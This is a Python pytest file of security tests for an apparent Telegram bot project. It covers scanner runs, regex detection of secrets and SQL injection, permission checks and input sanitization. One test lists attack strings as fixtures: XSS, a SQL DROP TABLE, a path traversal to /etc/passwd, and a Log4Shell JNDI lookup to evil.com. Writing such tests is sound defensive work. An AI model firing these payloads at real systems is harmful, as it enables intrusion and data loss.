"""
Vulnerability scanning and security assessment tests.
"""

import pytest
import subprocess
import os
import json
from pathlib import Path
from unittest.mock import patch, Mock


class TestVulnerabilityScanning:
    """Test vulnerability scanning capabilities."""

    @pytest.mark.security
    def test_dependency_security_scan(self):
        """Test dependency vulnerability scanning with safety."""
        try:
            # Run safety check on requirements
            result = subprocess.run(
                ['safety', 'check', '--json'],
                capture_output=True,
                text=True,
                timeout=60
            )
            
            if result.returncode == 0:
                # No vulnerabilities found
                vulnerabilities = []
            else:
                # Parse vulnerabilities if any
                try:
                    vulnerabilities = json.loads(result.stdout)
                except json.JSONDecodeError:
                    vulnerabilities = []
            
            # Should have no high-severity vulnerabilities
            high_severity = [v for v in vulnerabilities if v.get('severity', '').lower() in ['high', 'critical']]
            assert len(high_severity) == 0, f"Found {len(high_severity)} high-severity vulnerabilities"
            
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pytest.skip("Safety tool not available or timed out")

    @pytest.mark.security
    def test_static_code_analysis_bandit(self):
        """Test static code analysis for security issues."""
        try:
            # Run bandit security analysis
            result = subprocess.run(
                ['bandit', '-r', 'src/', '-f', 'json'],
                capture_output=True,
                text=True,
                timeout=120
            )
            
            if result.stdout:
                try:
                    bandit_results = json.loads(result.stdout)
                    issues = bandit_results.get('results', [])
                    
                    # Filter high and medium severity issues
                    high_severity = [i for i in issues if i.get('issue_severity') in ['HIGH', 'MEDIUM']]
                    
                    # Should have no high/medium severity security issues
                    assert len(high_severity) == 0, f"Found {len(high_severity)} security issues"
                    
                except json.JSONDecodeError:
                    pass  # Bandit output might not be JSON in all cases
                    
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pytest.skip("Bandit tool not available or timed out")

    @pytest.mark.security
    def test_secrets_detection(self):
        """Test for accidentally committed secrets."""
        project_root = Path(__file__).parent.parent.parent
        
        # Patterns that might indicate secrets
        secret_patterns = [
            r'(?i)(password|passwd|pwd)\s*=\s*["\'][^"\']+["\']',
            r'(?i)(secret|key|token)\s*=\s*["\'][^"\']+["\']',
            r'(?i)api[_-]?key\s*=\s*["\'][^"\']+["\']',
            r'-----BEGIN\s+(RSA\s+)?PRIVATE\s+KEY-----',
            r'(?i)bearer\s+[a-zA-Z0-9_\-\.]+',
        ]
        
        import re
        found_secrets = []
        
        # Scan source files
        for file_path in project_root.rglob('*.py'):
            if 'test' in str(file_path):
                continue  # Skip test files
                
            try:
                content = file_path.read_text(encoding='utf-8')
                for pattern in secret_patterns:
                    matches = re.findall(pattern, content)
                    if matches:
                        # Check if it's a test/dummy value
                        for match in matches:
                            if not any(dummy in str(match).lower() for dummy in ['test', 'dummy', 'fake', 'example']):
                                found_secrets.append((str(file_path), pattern, match))
            except (UnicodeDecodeError, FileNotFoundError):
                continue
        
        assert len(found_secrets) == 0, f"Found potential secrets: {found_secrets}"

    @pytest.mark.security
    def test_file_permissions(self):
        """Test that sensitive files have appropriate permissions."""
        project_root = Path(__file__).parent.parent.parent
        
        sensitive_files = [
            '.env',
            '.env.local',
            'config.json',
            'secrets.json',
        ]
        
        for filename in sensitive_files:
            file_path = project_root / filename
            if file_path.exists():
                # Check file permissions (should not be world-readable)
                import stat
                file_stat = file_path.stat()
                mode = stat.filemode(file_stat.st_mode)
                
                # Should not have world read permissions
                assert not (file_stat.st_mode & stat.S_IROTH), f"File {filename} is world-readable: {mode}"

    @pytest.mark.security
    def test_environment_variable_security(self):
        """Test environment variable security practices."""
        from src.config.manager import ConfigManager
        
        # Test that sensitive env vars are not logged
        sensitive_env_vars = ['BOT_TOKEN', 'WEBHOOK_SECRET', 'DATABASE_URL']
        
        with patch('src.utils.logger.get_logger') as mock_logger:
            mock_log = Mock()
            mock_logger.return_value = mock_log
            
            config_manager = ConfigManager()
            
            # Try to trigger logging
            try:
                config_manager.get_bot_token()
            except:
                pass
            
            # Check that sensitive values are not in log calls
            all_log_calls = []
            for call_list in [mock_log.info.call_args_list, mock_log.debug.call_args_list, mock_log.warning.call_args_list]:
                all_log_calls.extend([str(call) for call in call_list])
            
            for env_var in sensitive_env_vars:
                env_value = os.getenv(env_var, '')
                if env_value and len(env_value) > 10:  # Only check non-empty, substantial values
                    for log_call in all_log_calls:
                        assert env_value not in log_call, f"Sensitive env var {env_var} found in logs"

    @pytest.mark.security
    def test_sql_injection_patterns(self):
        """Test for SQL injection vulnerabilities in code."""
        project_root = Path(__file__).parent.parent.parent
        
        # Dangerous SQL patterns
        dangerous_patterns = [
            r'(?i)SELECT\s+\*\s+FROM\s+\w+\s+WHERE\s+.*%s',
            r'(?i)INSERT\s+INTO\s+\w+\s+.*%s',
            r'(?i)UPDATE\s+\w+\s+SET\s+.*%s',
            r'(?i)DELETE\s+FROM\s+\w+\s+WHERE\s+.*%s',
            r'execute\s*\(\s*["\'].*%s.*["\']',
        ]
        
        import re
        found_issues = []
        
        for file_path in project_root.rglob('*.py'):
            if 'test' in str(file_path):
                continue
                
            try:
                content = file_path.read_text(encoding='utf-8')
                for pattern in dangerous_patterns:
                    if re.search(pattern, content):
                        found_issues.append((str(file_path), pattern))
            except (UnicodeDecodeError, FileNotFoundError):
                continue
        
        assert len(found_issues) == 0, f"Found potential SQL injection vulnerabilities: {found_issues}"

    @pytest.mark.security
    def test_hardcoded_credentials(self):
        """Test for hardcoded credentials in source code."""
        project_root = Path(__file__).parent.parent.parent
        
        # Common credential patterns
        credential_patterns = [
            r'password\s*=\s*["\'][^"\']+["\']',
            r'api_key\s*=\s*["\'][^"\']+["\']',
            r'secret_key\s*=\s*["\'][^"\']+["\']',
            r'token\s*=\s*["\'][^"\']+["\']',
        ]
        
        import re
        found_credentials = []
        
        for file_path in project_root.rglob('*.py'):
            if 'test' in str(file_path):
                continue
                
            try:
                content = file_path.read_text(encoding='utf-8')
                for pattern in credential_patterns:
                    matches = re.findall(pattern, content, re.IGNORECASE)
                    for match in matches:
                        # Skip obvious test/placeholder values
                        if not any(placeholder in match.lower() for placeholder in 
                                 ['test', 'dummy', 'fake', 'example', 'placeholder', 'your_', 'change_me']):
                            found_credentials.append((str(file_path), match))
            except (UnicodeDecodeError, FileNotFoundError):
                continue
        
        assert len(found_credentials) == 0, f"Found hardcoded credentials: {found_credentials}"

    @pytest.mark.security
    def test_insecure_random_usage(self):
        """Test for usage of insecure random functions."""
        project_root = Path(__file__).parent.parent.parent
        
        insecure_patterns = [
            r'import\s+random\b',
            r'from\s+random\s+import',
            r'random\.random\(\)',
            r'random\.choice\(',
            r'random\.randint\(',
        ]
        
        import re
        found_issues = []
        
        for file_path in project_root.rglob('*.py'):
            if 'test' in str(file_path):
                continue
                
            try:
                content = file_path.read_text(encoding='utf-8')
                for pattern in insecure_patterns:
                    if re.search(pattern, content):
                        # Check if it's used for security-sensitive operations
                        if any(keyword in content.lower() for keyword in ['token', 'key', 'secret', 'password', 'auth']):
                            found_issues.append((str(file_path), pattern))
            except (UnicodeDecodeError, FileNotFoundError):
                continue
        
        assert len(found_issues) == 0, f"Found insecure random usage in security contexts: {found_issues}"

    @pytest.mark.security
    def test_tls_ssl_configuration(self):
        """Test TLS/SSL configuration security."""
        from src.handlers.webhook import WebhookHandler
        
        webhook_handler = WebhookHandler()
        
        # Test webhook URLs are HTTPS only
        insecure_urls = [
            "http://example.com/webhook",
            "ftp://example.com/webhook",
            "ws://example.com/webhook",
        ]
        
        for url in insecure_urls:
            assert not webhook_handler.validate_webhook_url(url), f"Insecure URL {url} was allowed"
        
        # Test secure URLs are allowed
        secure_urls = [
            "https://secure-domain.com/webhook",
            "https://api.telegram.org/webhook",
        ]
        
        for url in secure_urls:
            assert webhook_handler.validate_webhook_url(url), f"Secure URL {url} was rejected"

    @pytest.mark.security
    def test_input_validation_completeness(self):
        """Test that input validation is comprehensive."""
        from src.utils.validators import InputValidator
        
        # Test various malicious inputs
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/exploit}",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "data:text/html,<script>alert('xss')</script>",
        ]
        
        for malicious_input in malicious_inputs:
            sanitized = InputValidator.sanitize_html_input(malicious_input)
            
            # Check that dangerous patterns are removed
            dangerous_patterns = [
                '<script', 'javascript:', 'onerror=', 'DROP TABLE', '../', 'jndi:', 'data:'
            ]
            
            for pattern in dangerous_patterns:
                assert pattern.lower() not in sanitized.lower(), f"Dangerous pattern '{pattern}' not removed from: {sanitized}"